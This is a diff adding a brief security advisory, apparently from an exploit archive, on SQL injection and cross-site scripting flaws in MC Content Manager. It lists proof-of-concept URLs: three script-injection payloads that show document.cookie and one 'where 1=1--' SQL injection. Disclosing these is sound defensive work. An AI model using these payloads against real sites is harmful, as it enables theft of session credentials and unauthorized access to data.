@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/41949/info
+
+MC Content Manager is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+Cross site scripting:
+
+1) http://www.example.com/article.php?root=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+2) http://www.example.com/static.php?page=1%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+3) http://www.example.com/cms/%3Cbody%20onload=alert(document.cookie)%3E/
+
+SQL Injection:
+
+1) http://www.example.com/cms/ua%20where%201=1--%20/ 
